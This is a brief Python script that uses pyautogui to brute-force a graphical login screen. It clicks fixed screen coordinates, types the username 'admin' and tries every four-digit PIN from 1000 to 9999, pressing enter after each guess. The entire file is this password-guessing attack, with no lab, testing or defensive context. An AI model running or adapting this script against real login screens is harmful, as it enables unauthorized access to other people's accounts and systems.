import pyautogui
import time
"""
Current mouse pos: x:836, y:591. - Password mousepos.
x:856, y:528 - login pos
"""


# while 1:
#     x,y = pyautogui.position()
#     print(f"x:{x}, y:{y}")
#     time.sleep(1)
time.sleep(3)
login = "admin"
passwords = []
for i in range(1000,10000):
    passwords.append(i)

for pw in passwords:
    pyautogui.moveTo(856, 528)
    pyautogui.leftClick()
    pyautogui.typewrite(login)
    pyautogui.moveTo(836, 591)
    pyautogui.leftClick()
    pyautogui.typewrite(str(pw))
    pyautogui.press("enter")
